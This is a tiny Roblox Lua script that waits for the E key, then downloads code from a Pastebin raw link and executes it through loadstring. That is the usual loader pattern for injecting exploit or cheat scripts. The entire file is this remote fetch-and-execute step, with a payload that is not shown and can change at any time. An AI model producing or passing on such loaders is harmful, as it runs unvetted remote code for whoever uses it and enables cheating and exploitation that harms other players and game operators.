local UIS = game:GetService('UserInputService')
local Player = game.Players.LocalPlayer
local Character = Player.Character

UIS.InputBegan:connect(function(input)
 if input.KeyCode == Enum.KeyCode.E then
  loadstring(game:HttpGet('https://pastebin.com/raw/SVrENK4J', true))()
         end
end)
